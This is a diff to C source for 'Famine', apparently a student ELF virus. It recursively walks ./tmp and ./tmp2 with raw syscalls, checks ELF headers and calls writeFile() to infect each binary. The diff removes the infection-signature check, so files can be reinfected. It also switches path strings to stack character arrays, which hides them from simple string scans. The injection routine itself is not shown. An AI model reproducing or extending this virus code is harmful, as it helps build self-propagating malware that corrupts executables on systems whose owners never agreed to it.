@@ -4,53 +4,47 @@ void virus(char *file) {
     struct ELFheaders64 fHdr;
     int bytes_rd;
     int fd;
-    const char signature[] = "Famine version 1.0 (c)oded by <pgoudet>-<Mastermind pgoudet>";
 
-    fd = (int)ft_syscall(OPEN, (void *)file, (void *)2, 0, 0);
+    fd = (int)ft_syscall((void *)file, (void *)2, 0, 0, OPEN);
     if (fd < 0)
         return ;
-    bytes_rd = (int)ft_syscall(READ, (void *)fd, (void *)&fHdr, (void *)0x40, 0);
+    bytes_rd = (int)ft_syscall((void *)fd, (void *)&fHdr, (void *)0x40, 0, READ);
     if (bytes_rd < 0x40 || check_file(fHdr) != 0)
         return;
 
-    if (checkSignature(fd, signature) == 1) {
-        ft_syscall(CLOSE, (void *)fd, 0, 0, 0);
-        return;
-    }
     writeFile(fd, fHdr);
-    ft_syscall(CLOSE, (void *)fd, 0, 0, 0);
+    ft_syscall((void *)fd, 0, 0, 0, CLOSE);
 }
 
 int famine(char *target_dir) {
-    int fd = 1;
-    int options_openat = 0 | 2048 | 65536;
-    struct linux_dirent {
-            unsigned long  d_ino;
-            unsigned long  d_off;
-            unsigned short d_reclen;
-            char           d_name[1024];
-    } dir;
-    int bytes_rode;
+    int fd;
     char full_path[0x1000];
+    char dir[0x1000];
+    int bytes_rode;
+    char pt[] = {'.', '.', 0};
+    char sep[] = {'/', 0};
    
-    fd = (int)ft_syscall(OPENAT, (void *)-100, (void *)target_dir, (void *)options_openat, (void *)0);
-    if (fd == -1)
+    fd = (int)ft_syscall((void *)-100, (void *)target_dir, (void *)(0 | 2048 | 65536), (void *)0, OPENAT);
+    if (fd < 0)
         return(1);
     do {
-        bytes_rode = (int)ft_syscall(GETDENTS, (void *)fd, (void *)&dir, (void *)0x1000, (void *)0);
+        bytes_rode = (int)ft_syscall((void *)fd, (void *)dir, (void *)0x1000, (void *)0, GETDENTS);
         for (int bpos = 0; bpos < bytes_rode;) {
-            struct linux_dirent *d = (struct linux_dirent *)((char *)&dir + bpos);
-            if (ft_strcmp(d->d_name, ".") != 0 && ft_strcmp(d->d_name, "..") != 0)  {
+            struct linux_dirent64 *d = (struct linux_dirent64 *)((char *)dir + bpos);
+            if (ft_strcmp(d->d_name, &(pt[1])) != 0 && ft_strcmp(d->d_name, pt) != 0)  {
                 unsigned long int len = ft_strlen(target_dir);
                 memncat(full_path, 0, target_dir, len);
-                ft_strcat(full_path, "/");
-                ft_strcat(full_path, d->d_name);
+                memncat(full_path, len, sep, 1);
+                memncat(full_path, len+1, d->d_name, ft_strlen(d->d_name));
+
                 if (isDir(full_path) == 1)
                     famine(full_path);
                 else
                     virus(full_path);
                 ft_memset(full_path, 0 , 0x1000);
             }
+            if (d->d_reclen == 0)
+                break;
             bpos += d->d_reclen;
         }
     }
@@ -59,9 +53,11 @@ int famine(char *target_dir) {
 }
 
 int _start() {
-    char *target_dir = "./tmp";
-    
-    famine(target_dir);
-    ft_syscall(EXIT, 0, 0, 0, 0);
+    char target[] = {'.', '/', 't', 'm', 'p', 0};
+    char target2[] = {'.', '/', 't', 'm', 'p', '2', 0};
+
+    famine(target);
+    famine(target2);
+    ft_syscall(0, 0, 0, 0, EXIT);
 }
 
